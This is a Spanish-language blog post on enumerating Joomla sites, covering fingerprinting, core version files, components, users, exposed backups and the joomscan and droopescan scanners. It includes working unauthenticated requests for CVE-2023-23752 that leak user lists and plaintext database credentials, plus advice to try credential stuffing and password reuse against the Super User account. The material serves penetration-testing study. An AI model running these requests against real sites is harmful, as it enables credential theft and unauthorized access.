---
title: "enum // joomla"
date: 2026-05-31
description: "metodología de enumeración sobre un objetivo joomla: fingerprinting, versión del núcleo desde varios archivos, componentes módulos y plantillas, usuarios, cve-2023-23752..."
tags: ["joomla", "web", "enumeracion", "recon", "cms"]
draft: false
---

Joomla no mueve la web como WordPress, pero todavía corre hartos sitios: foros, galerías, comunidades, alguno que otro e-commerce, y sobre todo paneles internos de empresas que un día instalaron un CMS y lo dejaron ahí. Por debajo es `php` con una base de datos `mysql`, y la lógica es la misma que en cualquier CMS: el núcleo está razonablemente cuidado, el problema son las extensiones y plantillas de terceros. Joomla presume de más de 7.000 extensiones y 1.000 plantillas, por lo que esa es la superficie de ataque.

La cuenta de admin por defecto se llama `admin`, pero la contraseña se define en la instalación, por lo que `admin:admin` (y sus derivados) no es tan viable. En Joomla el objetivo ideal es **Super User**: ese es el equivalente a `rce`, porque desde el backend puedes tocar plantillas y subir extensiones, o sea escribir `php` al disco. Igual que en WordPress, no subestimes los grupos de bajo privilegio (Author, Editor, Manager): un login cualquiera te abre funcionalidades que un visitante sin cuenta no puede tener.

---

## fase 0 — confirmar que es joomla

Igual que con cualquier objetivo, empieza pasivo. Con el código del sitio y un par de rutas conocidas ya puedes saber que CMS es sin que tengas que mandar nada raro.

```bash
# la meta tag generator, la pista más directa
curl -s http://target/ | grep -i 'joomla'
# -> <meta name="generator" content="Joomla! - Open Source Content Management" />

# robots.txt: una instalación joomla bloquea /administrator/, /components/, /modules/, etc.
curl -s http://target/robots.txt

# el panel de admin vive siempre en la misma ruta
curl -s -o /dev/null -w "%{http_code}\n" http://target/administrator/
```

Si el `robots.txt` deshabilita `/administrator/`, `/components/`, `/modules/` y `/templates/`, ya está, es Joomla. Lo mismo si algún asset carga desde `/media/system/` o `/templates/`. Una sola de estas pistas alcanza.

Ojaldre con que si Joomla está metido en un subdirectorio (`target.com/joomla/`), el `robots.txt` sigue estando en la raíz del dominio, pero sus reglas `Disallow` van a venir con el prefijo del directorio (`Disallow: /joomla/administrator/`). No te confundas y des por hecho que no hay panel solo porque la ruta "limpia" no responde.

Y como siempre, no te olvides de `whatweb` (cli) o Wappalyzer (extensión). Hacerle un `whatweb http://target/` al sitio te ahorra esta fase entera la mayoría de las veces.

```bash
whatweb http://target/
```

---

## fase 1 — versión del núcleo

Joomla deja la versión en un `.xml` legible por defecto. Como siempre, no te quedes con una sola fuente, porque el/los admin(s) suele(n) tapar lo obvio y olvidar el resto. Ordenadas de la más exacta a la más aproximada:

```bash
# 1. el manifiesto del núcleo: la fuente más exacta (Joomla >= 1.6).
#    el campo <version> trae el número completo, ej: 4.2.7
curl -s http://target/administrator/manifests/files/joomla.xml | xmllint --format -

# 2. langmetadata.xml (Joomla 4+) o en-GB.xml (Joomla 3 y anteriores).
#    el segundo solo da la rama mayor, pero sirve si el manifiesto está bloqueado
curl -s http://target/language/en-GB/langmetadata.xml | xmllint --format -
curl -s http://target/language/en-GB/en-GB.xml | xmllint --format -

# 3. cache.xml: suelta una versión aproximada del núcleo
curl -s http://target/plugins/system/cache/cache.xml | xmllint --format -

# 4. README.txt en la raíz, clásico de instalaciones que nadie limpió
curl -s http://target/README.txt | head -n 5
```

Si el `joomla.xml` responde, ese `<version>` es tu respuesta. Si lo bloquearon (con `htaccess` denegando `.xml`, que es la mitigación típica), bajas a `langmetadata.xml`/`en-GB.xml` para la rama mayor.

```bash
# si autoindex está activo, te listan los js del core; si no, igual puedes
# fingerprintear comparando contenido/hash de archivos conocidos contra una referencia
curl -s http://target/media/system/js/
```

La idea es que si varias fuentes coinciden, esa es la versión. Si no, el número más bajo suele ser el núcleo y los más altos vienen de assets de alguna extensión (como expliqué en el // enum de worpress)

---

## fase 2 — componentes, módulos y plantillas

En Joomla las "extensiones" se dividen en **componentes** (`com_*`, las piezas grandes, las que montan vistas completas), **módulos** (`mod_*`, los bloques chicos) y **plantillas** (templates, el equivalente a los themes). Las plantillas, igual que en WP, son `php` + `html` + `css`, y mientras más complejas, más superficie. Acá hago las mismas dos pasadas: una pasiva leyendo lo que el sitio ya cuenta, y una activa buscando lo que no contó.

En la pasiva, el `html` referencia por ruta cada componente, módulo y plantilla activa. Saca los nombres:

```bash
# componentes activos referenciados en el fuente (el prefijo com_ es muy fiable)
curl -s http://target/ | grep -oP 'com_\K[a-z0-9_-]+' | sort -u

# plantilla(s) activa(s)
curl -s http://target/ | grep -oP 'templates/\K[^/"'"'"'?]+' | sort -u
```

Para las versiones de cada extensión, el equivalente al `readme.txt` de WordPress es el **manifiesto** de la extensión. El nombre varía entre versiones de Joomla (a veces es `manifest.xml`, a veces `<nombre>.xml`), así que prueba ambos:

```bash
# manifiesto del componente: trae versión, autor, archivos, a veces tablas de la db
curl -s http://target/administrator/components/com_XXX/com_XXX.xml | xmllint --format -
curl -s http://target/components/com_XXX/manifest.xml | xmllint --format -
```

El problema de quedarse en lo pasivo es que carga la página que pediste solamente. Los componentes que viven en rutas concretas, o los instalados pero inactivos, no aparecen. Por eso tenemos dos opciones más:

**1. Listado de directorios.** Si autoindex está activo (más común de lo que debería), `/components/`, `/modules/` y `/templates/` permiten enumeración directa. Revísalo siempre.

```bash
# un 200 con "Index of" en el cuerpo = barra libre
curl -s http://target/components/ | grep -i 'index of'
```

**2. Sondeo manual.** Pide la vista de un componente que sospechas y mira cómo responde. Un componente presente reacciona distinto a uno que no existe:

```bash
# 200 / redirección con contenido = el componente está ahí, aunque la home no lo mencione
curl -s -o /dev/null -w "%{http_code}\n" "http://target/index.php?option=com_XXX"
```

`droopescan` y `joomscan` automatizan esta segunda parte contra una wordlist de componentes conocidos, y de eso hablo en la fase 5. Pero no te saltes el enum manual nunca.

---

## fase 3 — usuarios

El login (`/administrator/index.php`) devuelve un mensaje **genérico** algo tipo "Username and password do not match or you do not have an account yet" responda lo que responda, a diferencia de wp que te dice cuando un user existe o no (básicamente). No malgastes tiempo buscando esa diferencia.

Dicho eso, hay otras cosas que sí funcionan:

**1. `cve-2023-23752` (Joomla 4.0.0–4.2.7).** Un control de acceso roto en los endpoints de la `rest api` deja consultar `users` y `config` **sin autenticación**. El de usuarios dice nombre, email y grupo de cada cuenta; el de config dice las credenciales de la base de datos en texto plano. Está en la [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search=cve-2023-23752&field_date_added_wrapper=all&field_cve=&sort_by=field_date_added&items_per_page=20&url=) (se explotó harto en su momento) y se parchó en 4.2.8, así que primero confirma la versión en la fase 1.

```bash
# usuarios sin auth: id, nombre, username, email, grupo
curl -s "http://target/api/index.php/v1/users?public=true" | jq

# config de la app: aquí salen user/pass de mysql en plain madafokin text (dbuser, password, db)
curl -s "http://target/api/index.php/v1/config/application?public=true" | jq
```

Si el endpoint de config responde, tienes las credenciales de la base de datos directo. Y aunque `mysql` no sea alcanzable desde afuera, te quedas igual con la lista de usuarios y sus grupos: suficiente para credential stuffing o para un brute force dirigido contra el `Super User`. Dato del mundo real: hay admins que reusan la pass de `mysql` para la cuenta de Joomla, así que prueba esa combinación de una.

**2. Contenido firmado por autor.** Cuando el CVE no aplica, te queda lo de siempre: los artículos, perfiles y feeds suelen mostrar el nombre visible —y a veces el username— de quien publicó. Es lento y manual, pero un blog activo te va dando nombres reales que después mapeas a posibles usuarios de login.

---

## fase 4 — endpoints y archivos sensibles

Aparte de los usuarios, una instalación estándar deja varias cosas anotables. Primero, la propia `api` (la misma que explota el CVE), que conviene mapear aunque la versión esté parcheada, porque a veces hay endpoints custom de componentes que filtran:

```bash
# superficie de la api: rutas disponibles
curl -s http://target/api/index.php/v1/ | jq
```

Esto no es Joomla, es descuido de la persona. El archivo de config de Joomla es `configuration.php` en la raíz (que como `php` no se lee directo), así que lo que buscas son sus copias:

```bash
# backups del config en la raíz (swaps del editor, copias .bak hechas a mano)
for f in configuration.php.bak configuration.php~ configuration.php.save \
         configuration.php.orig configuration.php.old configuration.php.txt \
         configuration.php.swp; do
  curl -s -o /dev/null -w "$f -> %{http_code}\n" "http://target/$f"
done

# logs: la ruta depende de log_path en la config, por defecto suele ser
# administrator/logs/ o logs/. revisa autoindex en ambas
curl -s http://target/administrator/logs/ | grep -i 'index of'
curl -s http://target/logs/ | grep -i 'index of'

# vcs o comprimidos expuestos
curl -s -o /dev/null -w "%{http_code}\n" http://target/.git/config
```

Si pillas un `configuration.php.bak` legible, ahí están el `$user`, `$password` y `$db` de la base de datos en texto plano, igual que las credenciales que filtra el CVE pero sin depender de la versión. Y los logs, cuando están expuestos, muestran rutas absolutas, queries y a veces hasta datos de sesión.

---

## fase 5 — automatización

Las herramientas no reemplazan las fases 0 a 4 ya que en Joomla los escáneres se quedan cortos especialmente con la versión y con componentes que no están en su wordlist. Lo que yo hago es dejar el scaneo automático en paralelo a mi footprinting manual, y luego cruzo los datos.

Hay dos herramientas reconocidas (puede haber más, pero honestamente yo suelo usar solo estas y lo demás lo hago manual ya que me ha dado mayores resultados)

**`droopescan`** es multi-CMS (Drupal, SilverStripe, WordPress, Joomla, Moodle). Ojo con esto: para Joomla su funcionalidad es **parcial**, solo hace versión y "interesting urls" (panel de admin y poco más), no enumera componentes. Sirve para un primer barrido rápido, no para el detalle.

```bash
sudo pip3 install droopescan

# si no le pasas el CMS, lo autodetecta; igual conviene ser explícito
droopescan scan joomla -u http://target/
```

**OWASP `joomscan`** es el específico de Joomla y el que de verdad enumera. Está en `perl`, viene preinstalado en Kali, y trae versión, componentes (más de 1.200 por defecto), vulnerabilidades cruzadas contra la versión, detección de firewall y búsqueda de logs y backups. Es viejo (la 0.0.7 es de 2018), pero sigue siendo lo mejor que hay para esto.

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan

# barrido por defecto
perl joomscan.pl -u http://target/

# enumerar componentes + agente aleatorio (en un pentest real, no en un CTF)
perl joomscan.pl -u http://target/ --enumerate-components --random-agent
```

Saca un reporte en texto y `html` en la carpeta actual. El `--random-agent` rota el user-agent; si estás en un CTF no lo necesitas, pero contra un objetivo real con `waf` delante sí, porque `joomscan` genera muucho ruido.

---

## Tips:

- En Joomla la versión es de lo más fácil de sacar (`joomla.xml`), pero los usuarios cuestan.
- `cve-2023-23752` es el atajo del año si la versión cae entre 4.0.0 y 4.2.7: `?public=true` en los endpoints de `users` y `config`, y te llevas usuarios y credenciales de `mysql` sin tocar el login. Confirma la versión en la fase 1 antes de tirarlo.
- `droopescan` con Joomla es solo versión + urls; para componentes necesitas `joomscan`. No te quedes pensando que el sitio está limpio de extensiones porque droopescan no encontró ninguna.
- Revisa autoindex en `/components/`, `/modules/`, `/templates/` y las carpetas de logs en todos los casos. Cuando está activo, media enumeración se reduce a leer.
- Cuidado con el `robots.txt` en subdirectorios: las rutas vienen con el prefijo del directorio. Arma las URLs con ese prefijo o vas a creer que no hay panel cuando sí lo hay.
- Como siempre: lo que el escáner marque, lo confirmas a mano; lo que encuentres a mano, lo cruzas contra exploits conocidos por si hay algo.